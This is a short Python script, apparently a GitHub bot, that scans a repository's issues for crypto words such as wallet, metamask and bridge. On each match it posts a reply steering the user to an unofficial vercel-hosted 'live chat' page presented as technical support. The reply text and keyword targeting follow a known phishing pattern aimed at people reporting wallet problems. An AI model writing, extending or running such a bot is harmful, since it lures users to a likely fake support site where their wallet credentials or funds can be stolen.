import requests
import os

TOKEN = os.getenv("GITHUB_TOKEN")

OWNER = "nathanbrooks-eng"
REPO = "issue-bot-test"

CRYPTO_KEYWORDS = [
    "wallet",
    "ledger",
    "token",
    "metamask",
    "swap",
    "bridge"
]

# Your reply text
AUTO_REPLY = """
For quick review and assistance, contact the hub agent on the live chat page to report your issue via the [Live chat page](https://securechain-dapps.vercel.app/) to ensure total review with the technical support.

Team 🚀
"""

# GitHub API headers
headers = {
    "Authorization": f"token {TOKEN}",
    "Accept": "application/vnd.github+json"
}

# 1️⃣ build URL
url = f"https://api.github.com/repos/{OWNER}/{REPO}/issues"

# 2️⃣ make request
response = requests.get(url, headers=headers)

# 3️⃣ check request worked
if response.status_code != 200:
    print("Error:", response.status_code, response.text)
    exit()

# 4️⃣ NOW parse JSON
issues = response.json()

# 5️⃣ loop issues
for issue in issues:
    if "pull_request" in issue:
        continue

    title = (issue["title"] or "").lower()
    body = (issue["body"] or "").lower()

    if any(k in title or k in body for k in CRYPTO_KEYWORDS):
        issue_number = issue["number"]
        comment_url = f"https://api.github.com/repos/{OWNER}/{REPO}/issues/{issue_number}/comments"

        # Get existing comments
        comments = requests.get(comment_url, headers=headers).json()

        # Prevent duplicate replies
        already_replied = any(
            c["user"]["type"] == "Bot" for c in comments
        )

        if already_replied:
            print(f"Already replied to issue #{issue_number}, skipping.")
            continue

        # Post reply
        response = requests.post(
            comment_url,
            headers=headers,
            json={"body": AUTO_REPLY}
        )

        if response.status_code != 201:
            print(f"Failed to post comment: {response.status_code}, {response.text}")
        else:
            print(f"Replied to issue #{issue_number}")

